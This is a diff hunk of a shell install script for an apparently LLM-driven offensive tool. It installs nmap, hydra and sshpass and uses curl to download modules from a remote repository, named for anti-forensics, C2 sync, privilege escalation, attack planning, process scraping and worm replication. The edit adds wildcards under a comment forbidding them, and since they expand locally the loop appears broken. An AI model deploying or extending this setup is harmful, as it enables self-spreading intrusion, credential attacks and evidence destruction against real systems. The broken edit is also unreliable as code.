@@ -12,12 +12,7 @@ apt-get update -y
 apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync
 
 # Download each file explicitly (no wildcards!)
-for file in \
-    main.py \
-    core/daemonizer.py core/orchestrator.py core/anti_forensics.py core/c2_sync.py core/llm_brain.py \
-    modules/network_recon.py modules/file_crawler.py modules/privesc_engine.py modules/attack_planner.py modules/worm_replicator.py modules/process_scraper.py \
-    utils/net_utils.py utils/crypto_utils.py utils/logging_utils.py \
-    requirements.txt; do
+for file in main.py config.py core/*.py modules/*.py utils/*.py requirements.txt; do
     mkdir -p "$(dirname "$file")"
     curl -s -o "$file" "$REPO_URL/$file"
 done
